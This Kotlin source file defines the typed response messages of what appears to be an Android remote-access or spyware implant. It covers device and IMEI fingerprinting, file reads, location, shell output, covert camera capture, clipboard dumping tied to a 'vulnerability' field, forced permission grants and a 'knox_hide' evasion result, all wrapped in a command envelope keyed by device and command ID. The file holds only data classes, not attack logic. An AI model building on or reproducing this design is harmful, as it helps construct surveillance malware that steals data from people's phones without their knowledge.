package org.synapse.core.core

import kotlinx.serialization.SerialName
import kotlinx.serialization.Serializable

// ─── Sealed class hierarchy of all typed responses ──────────────────────────

@Serializable
sealed class SynapseResponse {

    @Serializable
    @SerialName("ping")
    data class PingResponse(
        val pong: Boolean = true,
        val latency_ms: Long = 0
    ) : SynapseResponse()

    @Serializable
    @SerialName("device_info")
    data class DeviceInfoResponse(
        val model: String,
        val brand: String,
        val manufacturer: String,
        val sdk: Int,
        val release: String,
        val fingerprint: String,
        val hardware: String,
        val android_id: String,
        val imei: String = ""
    ) : SynapseResponse()

    @Serializable
    @SerialName("file_list")
    data class FileListResponse(
        val entries: List<FileEntry>
    ) : SynapseResponse()

    @Serializable
    @SerialName("file_read")
    data class FileReadResponse(
        val file_id: String,
        val mime_type: String,
        val size_bytes: Long,
        val base64_data: String
    ) : SynapseResponse()

    @Serializable
    @SerialName("location")
    data class LocationResponse(
        val lat: Double,
        val lng: Double,
        val accuracy: Float,
        val provider: String
    ) : SynapseResponse()

    @Serializable
    @SerialName("shell")
    data class ShellResponse(
        val exit_code: Int,
        val stdout: String,
        val stderr: String
    ) : SynapseResponse()

    @Serializable
    @SerialName("camera")
    data class CameraResponse(
        val image_base64: String,
        val width: Int = 0,
        val height: Int = 0,
        val format: String = "JPEG",
        val size_bytes: Long = 0
    ) : SynapseResponse()

    @Serializable
    @SerialName("clipboard")
    data class ClipboardResponse(
        val provider_type: String,
        val vulnerability: String = "",
        val entry_count: Int,
        val entries: List<ClipboardEntry>
    ) : SynapseResponse()

    @Serializable
    @SerialName("permission_grant")
    data class PermissionGrantResponse(
        val target_permissions: List<String>,
        val granted: List<String>,
        val failed: List<String>,
        val details: String = ""
    ) : SynapseResponse()

    @Serializable
    @SerialName("knox_hide")
    data class KnoxHideResponse(
        val technique: String,
        val success: Boolean,
        val service_status: String,
        val target_package: String = "",
        val details: String = ""
    ) : SynapseResponse()

    @Serializable
    @SerialName("error")
    data class ErrorResponse(
        val error: String,
        val module: String
    ) : SynapseResponse()
}

// ─── Supporting types ───────────────────────────────────────────────────────

@Serializable
data class FileEntry(
    val id: String,
    val name: String,
    val size: Long,
    val date: Long,
    val path: String = ""
)

@Serializable
data class ClipboardEntry(
    val text: String = "",
    val mime_type: String = "text/plain",
    val timestamp: Long = 0,
    val uri: String = ""
)

// ─── Response envelope — wraps all typed responses for transport ────────────

@Serializable
data class ResponseEnvelope(
    val type: String,
    val timestamp: Long = System.currentTimeMillis(),
    val device_id: String = "",
    val cmd_id: String = "",
    val status: String = "ok",
    val payload: SynapseResponse? = null,
    val error: String = ""
)
